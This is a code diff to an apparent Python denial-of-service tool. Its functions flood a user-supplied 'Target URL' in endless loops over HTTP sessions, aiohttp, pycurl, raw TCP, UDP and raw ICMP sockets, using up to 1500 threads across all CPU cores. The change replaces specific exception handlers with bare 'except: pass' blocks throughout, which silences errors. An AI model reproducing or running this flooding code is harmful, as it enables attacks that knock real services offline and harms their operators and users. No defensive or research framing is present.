@@ -36,7 +36,7 @@ def send_requests_threaded(target, stop_flag):
         while not stop_flag.value:
             try:
                 session.get(target, timeout=5, verify=False)
-            except requests.exceptions.RequestException:
+            except:
                 pass
 
     num_threads = 1500  # استخدام 1500 خيط كحد أقصى
@@ -53,7 +53,7 @@ async def send_requests_aiohttp(target, stop_flag):
             try:
                 async with session.get(target, timeout=5) as response:
                     await response.text()
-            except aiohttp.ClientError:
+            except:
                 pass
 
 def send_requests_pycurl(target, stop_flag):
@@ -66,7 +66,7 @@ def send_requests_pycurl(target, stop_flag):
         c.setopt(c.SSL_VERIFYHOST, 0)
         try:
             c.perform()
-        except pycurl.error:
+        except:
             pass
         finally:
             c.close()
@@ -78,7 +78,7 @@ def send_requests_socket(target, stop_flag):
             sock.connect((target, 443))
             sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
             sock.close()
-        except socket.error:
+        except:
             pass
 
 def send_requests_udp(target, stop_flag):
@@ -87,7 +87,7 @@ def send_requests_udp(target, stop_flag):
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, 443))
             sock.close()
-        except socket.error:
+        except:
             pass
 
 def send_requests_icmp(target, stop_flag):
@@ -96,7 +96,7 @@ def send_requests_icmp(target, stop_flag):
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
             sock.close()
-        except socket.error:
+        except:
             pass
 
 def show_attack_animation():
@@ -107,8 +107,8 @@ def start_attack():
         target = input("Target URL: ")
         print("Attack will continue indefinitely. Type 'stop' to end it.")
         execute_attack(target)
-    except Exception as e:
-        print(f"Error: {str(e)}")
+    except:
+        pass
 
 def execute_attack(target):
     total_cores = multiprocessing.cpu_count()
@@ -158,15 +158,15 @@ def execute_attack(target):
             stop_attack_flag.value = True
         print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
 
-    except Exception as e:
-        print(f"Error during attack: {str(e)}")
+    except:
+        pass
 
 def main():
     try:
         display_banner()
         password_prompt()
-    except Exception as e:
-        print(f"Error: {str(e)}")
+    except:
+        pass
 
 if __name__ == "__main__":
     main()
